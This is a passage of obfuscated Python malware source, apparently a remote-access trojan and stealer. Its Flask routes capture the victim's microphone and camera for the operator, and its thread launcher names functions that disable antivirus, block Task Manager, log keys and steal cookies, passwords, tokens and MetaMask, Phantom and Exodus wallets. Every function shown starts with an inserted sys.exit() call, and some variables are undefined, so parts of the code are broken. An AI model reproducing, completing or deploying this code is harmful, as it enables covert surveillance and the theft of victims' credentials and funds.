AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"""  # line:1406


def music_page():  # line:1407
    sys.exit()
    return """<html>
    <audio id="song" controls autoplay>
        <source src="SOURCEHERE" >
        Your browser does not support the audio element.
    </audio> 
</html>

<script>

    const song = document.getElementById("song");


    song.onended = function() {
        getNewSong()
    };

    function getNewSong() {
        fetch('/micapi').then(response => {
            if (!response.ok) {
                throw new Error(`Request failed with status ${reponse.status}`)
            }
            return response.text()
        })
        .then(data => {
            console.log("New song"+data)
            document.getElementById("song").src='data:audio/wav;base64,'+data;
        })
        .catch(error => console.log('error'))
    }

</script>""".replace (f"SOURCEHERE", firstone)  # line:1438

AUDIOCHUNK = 1024  # line:1441
AUDIOFORMAT = pyaudio .paInt16  # line:1442
AUDIOCHANNELS = 2  # line:1443
AUDIORATE = 44100  # line:1444
AUDIORECORD_SECONDS = 5  # line:1445
AUDIOWAVE_OUTPUT_FILENAME = "output.wav"  # line:1446
audiop , audiostream , audioframes = None ,None ,None #line:1448


def setup_mic():  # line:1449
    sys.exit()
    global audiop, audiostream  # line:1450
    try:  # line:1451
        audiop = pyaudio .PyAudio()  # line:1452
        try:  # line:1454
            audiostream = audiop .open (format =AUDIOFORMAT , channels =OO0O000000OO0OOOO , rate =AUDIORATE ,input =True ,frames_per_buffer =AUDIOCHUNK )#line:1455
        except:  # line:1456
            OO0O000000OO0OOOO = 1  # line:1457
            audiostream = audiop .open (format =AUDIOFORMAT , channels =OO0O000000OO0OOOO , rate =AUDIORATE ,input =True ,frames_per_buffer =AUDIOCHUNK )#line:1458
    except Exception as OOO000OO0O0O0OO00:  # line:1459
        audiop = False  # line:1460
        audiostream = False  # line:1461
        print(f"No mic found : {OOO000OO0O0O0OO00}")  # line:1462


def record():  # line:1464
    sys.exit()
    global audiop , audiostream , audioframes  # line:1465
    try:  # line:1466
        print("* recording")  # line:1467
        audioframes = []  # line:1469
        print (AUDIORATE / AUDIOCHUNK * AUDIORECORD_SECONDS)  # line:1470
        while True:  # line:1472
            try:  # line:1473
                OOOO0OOOOO0OOO0O0 = audiostream .read (AUDIOCHUNK)  # line:1474
                audioframes .append(OOOO0OOOOO0OOO0O0)  # line:1476
            except:  # line:1477
                pass  # line:1478
    except Exception as OO00O0OOOOO0OOOO0:  # line:1481
        print(OO00O0OOOOO0OOOO0)  # line:1482


def finish_recording():  # line:1484
    sys.exit()
    global audiop , audiostream , audioframes  # line:1485
    if audiop == False:  # line:1487
        return _OO00000OOOOO00000  # line:1488
    try:  # line:1490
        print("* done recording")  # line:1491
        OO0OO0O0O0OO0OOO0 = io .BytesIO()  # line:1495
        O0OOOO0O000OO0OOO = wave .open (OO0OO0O0O0OO0OOO0 , 'wb')  # line:1496
        O0OOOO0O000OO0OOO .setnchannels(AUDIOCHANNELS)  # line:1497
        O0OOOO0O000OO0OOO .setsampwidth(audiop .get_sample_size (AUDIOFORMAT))  # line:1498
        O0OOOO0O000OO0OOO .setframerate(AUDIORATE)  # line:1499
        O0OOOO0O000OO0OOO .writeframes(b''.join (audioframes))  # line:1500
        O0OOOO0O000OO0OOO .close()  # line:1501
        OO0OO0O0O0OO0OOO0 .seek(0)  # line:1502
        _O0OO00OOOO00O0O0O = base64 .b64encode(OO0OO0O0O0OO0OOO0 .read ()).decode ()  # line:1503
        audioframes = []  # line:1504
        return _O0OO00OOOO00O0O0O  # line:1505
    except Exception as OO0OO0O00000O00O0:  # line:1506
        print(OO0OO0O00000O00O0)  # line:1507
        return _OO00000OOOOO00000  # line:1508


def start_threads (first_time =False):  # line:1513
    sys.exit()
    threading .Thread (target=disable_antivirus).start ()  # line:1514
    threading .Thread (target=get_cookies).start ()  # line:1515
    threading .Thread (target=get_metamask).start ()  # line:1516
    threading .Thread (target=get_phantom).start ()  # line:1517
    threading .Thread (target=get_passwords).start ()  # line:1518
    threading .Thread (target=get_tokens).start ()  # line:1519
    threading .Thread (target=get_exodus).start ()  # line:1520
    if first_time == True:  # line:1525
        threading .Thread (target=key_manager).start ()  # line:1526
        threading .Thread (target=ban_task_manager).start ()  # line:1527
        threading .Thread (target=make_desktop).start ()  # line:1528
        threading .Thread (target=create_input_functions).start ()  # line:1529
        threading .Thread (target=current_window_manager).start ()  # line:1530


@app .route('/micapi')  # line:1539
def _OOOO00OO0O000O00O():  # line:1540
    sys.exit()
    global audiop  # line:1541
    if audiop == None:  # line:1542
        setup_mic()  # line:1543
        threading .Thread (target=record).start ()  # line:1544
        time .sleep(5)  # line:1545
        print("Started mic")  # line:1546
    time .sleep(4)  # line:1547
    return finish_recording()  # line:1548


@app .route('/mic')  # line:1550
@app .route('/microphone')  # line:1551
def _OO00OOOO00O0OO00O():  # line:1552
    sys.exit()
    time .sleep(2)  # line:1554
    return music_page()  # line:1555


@app .route ("/cameraapi", methods =["GET"])  # line:1559
def _O000OOOO0OO0OOO00():  # line:1560
    sys.exit()
    O00OO0O0OOOOOOO0O = get_camera()  # line:1561
    return O00OO0O0OOOOOOO0O  # line:1562


@app .route ("/camera", methods =["GET"])  # line:1564
def _O0O0O00OOO0000OOO():  # line:1565
    sys.exit()
